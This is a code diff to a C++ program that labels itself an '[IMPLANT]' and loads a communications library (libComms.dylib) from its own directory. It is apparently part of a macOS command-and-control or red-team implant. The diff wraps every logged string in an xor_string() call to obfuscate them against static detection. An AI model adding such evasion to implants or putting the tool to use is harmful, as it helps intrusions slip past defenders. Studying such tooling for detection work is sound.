@@ -7,6 +7,7 @@
 
 #include "Comms.hpp"
 #include "ClientPP.hpp"
+#include "no_strings.hpp"
 
 const char * PATH_TO_COMMS_LIB = "/tmp/store";
 
@@ -28,7 +29,7 @@ std::string getPathToExecutable() {
         std::size_t last = exePath.find_last_of("/");
         exePath = exePath.substr(0, last)+"/";
     } else {
-        std::cout << "[IMPLANT] Buffer too small" << std::endl;
+        std::cout << xor_string("[IMPLANT] Buffer too small") << std::endl;
         return "";
     }
 
@@ -54,7 +55,7 @@ void* loadComms(std::string exePath, std::string self) {
     void* dylib = NULL;
     DIR* directory = NULL;
     if ((directory = opendir(exePath.c_str())) == NULL) {
-        std::cout << "[IMPLANT] Can't open " + exePath << std::endl;
+        std::cout << xor_string("[IMPLANT] Can't open ") + exePath << std::endl;
         return dylib;
     }
 
@@ -64,7 +65,7 @@ void* loadComms(std::string exePath, std::string self) {
         snprintf(full_name, 512, "%s%s", exePath.c_str(), entry->d_name);
 
         if (entry->d_type == DT_DIR) {
-            std::cout << "[IMPLANT] Skipping directory in search for Comms file..." << std::endl;
+            std::cout << xor_string("[IMPLANT] Skipping directory in search for Comms file...") << std::endl;
         } else if (full_name == self){
             continue;
         } else {
@@ -106,11 +107,11 @@ int main(int argc, const char * argv[]) {
     // load libComms.dylib
     client.dylib = loadComms(client.pathProcess, argv[0]);
 
-    std::cout << "[IMPLANT] Executing process name is: " + std::string(argv[0]) << std::endl;
+    std::cout << xor_string("[IMPLANT] Executing process name is: ") + std::string(argv[0]) << std::endl;
 
     // check libComms was opened
     if (client.dylib == NULL) {
-        std::cout << "[IMPLANT] unable to load libComms.dylib (" + std::string(PATH_TO_COMMS_LIB) + ")" << std::endl;
+        std::cout << xor_string("[IMPLANT] unable to load libComms.dylib (") + std::string(PATH_TO_COMMS_LIB) + ")" << std::endl;
         return 1;
     }
 
